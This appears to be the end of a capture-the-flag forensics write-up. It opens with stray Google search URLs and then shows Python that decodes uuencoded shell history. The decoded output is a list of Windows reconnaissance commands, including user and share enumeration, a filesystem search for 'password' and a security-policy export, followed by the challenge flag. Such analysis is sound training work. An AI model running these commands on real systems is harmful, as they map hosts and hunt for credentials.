https://www.google.com/search?q=google translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sei=hsTaaIa1B8Gk5NoP6bix0QE&google_abuse=GOOGLE_ABUSE_EXEMPTION=ID=6f836c6faf2940ef:TM=1759167622:C=R:IP=3.225.222.31-:S=IxFMj-OHSm7BM9jl6VZetr4; path=/; domain=google.com; expires=Mon, 29-Sep-2025 20:40:22 GMT
https://www.google.com/search?q=google translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sei=qsTaaIKZHL_l5NoPm9PXwAc
https://www.google.com/search?q=google translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sg_ss=*sY2ajdXyAAb17ckR1e19xoshSE2V4ZgEADQBEArZ1NTCS_dSoMuWriJofvC-lTeJ0P1ZY88dwq7_cWN7bc6ZRk-XHAM5sEGg35Vw8ITiPQAAAHZtAAAAFFcBB0EANaiwmtpOq869PYTswVQqHza2mKbK9CLmheRGXJoYw74VAJsuOeHDOaZdJ8_2broGfLTCpjFGNQBfe8KGMKMY-E471WKloYsXxh0bSneZCWcHzve4cg8rFa1tenJz3Srkl2egVkLsK_gMja5NQClOQ-TuVjosdZNPijoCGptQZxAkrnClGVhMlL48WDybq2eohDRZfolrRiSmAkuhc5iGNPIV3lv4eoXYKSTuRJrNrhZc4MmqHekNVZDZeJlifLOmF1EK7ZQz4dJ1c2qc6vsv-97-c9NZZRRCSP1JOiuK1eP0nhLBnyVFVCx5gpMAu3fqpqE8rsSEgKB_b6E1lrSJfJriOB6Jfi9m5SkLRCiWQ9i7qv3Ik1cWcFJ3xS2pPO1OqYMKa6L4mmO8hLXVtMgPj86xAoLQf1Wf9Ix-sntxrFLX2Jh1tHkhHecEcVFKijlC8PDQUZS-EbC13SwtlWEl--diaosglmmlucfJoGdrrQQfvPQ4kH6lShWGkZtrZiknN8TtayDyni8blYNUezKvNkIvmkFHG4qIr1Ihyi_I9EQK0ZTYfGGfkQU5i9awctjb-Tk4k7D_P-f2y1ILwkUoD6F3cx-CN8AqnVFqDHn2MmqWod4-WJkkPhuH0JSNsvhSoDv9oB9mzOr2bQpqt-zzdZ3k3rnAjBcWFBUxndaTAbI9loUOlULC5j98CFxy5yUwf5XNthKntGRG2TcvVu4Wimln3vA1Rgu_ADO1OkF_dh5za0__E7KHMRGvecz9SQR7V__q4huhF3mAZORiSV1C_ccbd3Ee8Z3m8-8AOw-PFC1QqD9RjaDwnrTCguWWxXnB0NE0oxBbuWj4OsEKvk31vpXe1BDNe405JuW-siIY8GmlL3dNYnCBvvvkwsq2aTsyxbFUpVBV4seeiNJr5plfipF0PrmL9a_4V2U9JMHiSGgskBu3NVcKWH6dPtsyD_5I2lbadmZOs_VFVhIytYGPdEXFrFYvBw&sei=qsTaaIKZHL_l5NoPm9PXwAc
https://www.google.com/search?q=google translate github&sca_esv=219388647f983b16&ei=sMTaaMGfAu2u5NoPzfeD6Q8&ved=0ahUKEwjBt9ydwv6PAxVtF1kFHc37IP0Q4dUDCBA&uact=5&oq=google translate github&gs_lp=Egxnd3Mtd2l6LXNlcnAiF2dvb2dsZSB0cmFuc2xhdGUgZ2l0aHViMgUQABiABDIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB4yCBAAGBYYHhgKMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeSIoLUIsDWKYJcAB4ApABAJgBPqAB2AKqAQE3uAEDyAEA-AEBmAIIoAKdA8ICBBAAGEfCAgsQABiABBixAxiDAcICCBAAGIAEGLEDwgIOEAAYgAQYigUYsQMYgwHCAgsQABiABBiKBRiRAsICBxAAGIAEGAqYAwCIBgGQBgiSBwE4oAfwKrIHATe4B40DwgcFMi03LjHIBzQ&sclient=gws-wiz-serp
https://www.google.com/sorry/index?continue=https://www.google.com/search?q=google+translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google+translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sei=hsTaaIa1B8Gk5NoP6bix0QE&q=EgQD4d4fGIaJ68YGIjD2JH_nUHdDpzcTQflV_ZUkEM2f1nJQzzDJ3_aGfAmuhMPl36NKksqyoXxA2zKhRKwyAVJaAUM
sqlite> 
```

Now the following python code, parse the history commands, then decode the `uu encode` used.
```python
import re
import binascii

with open("history.txt", "r") as f:
    data = f.read()

commands = re.findall(r'begin 664 -\n(.*?)\n`?\nend', data, re.S)

def decode_uu(block):
    decoded_bytes = b""
    for line in block.splitlines():
        line = line.strip()
        if line:
            try:
                decoded_bytes += binascii.a2b_uu(line)
            except binascii.Error:
                pass  
    print(decoded_bytes.decode("utf-8", errors="ignore"))

for cmd in commands:
    decode_uu(cmd)
```

```bash
### output
systeminfo
netstat -ab
net session
gpresult /r
fsutil volume diskfree C:
schtasks /query /fo LIST /v
dir /a /s "C:Program Files"
net localgroup administrators
nslookup -type=any google.com
net user
sc query
net share
netstat -ano
ipconfig /all
tasklist /svc
sc qc lanmanserver
wevtutil qe System /c:10 /f:text
wmic bios get serialnumber,version
dir C: /s /b | findstr /i "password"
net localgroup "Remote Desktop Users"
icacls C:WindowsSystem32driversetchosts
wmic process get ProcessId,Name,CommandLine
reg query "HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun" /s
secedit /export /cfg C:WindowsTempsecpol.cfg
wmic logicaldisk get name,size,freespace,providername
attrib -s -h C:WindowsSystem32driversetchosts
echo %USERNAME% && echo %USERDOMAIN% && echo %COMPUTERNAME%
getmac /v /fo list
arp -a
route print
ping -n 4 8.8.8.8
tr@echo flag{69200c13dcb39de19a405e9d1f993821}
ipconfig /displaydns
ping -n 4 8.8.8.8
tasklist /v
whoami /all
```

Flag `flag{69200c13dcb39de19a405e9d1f993821}`





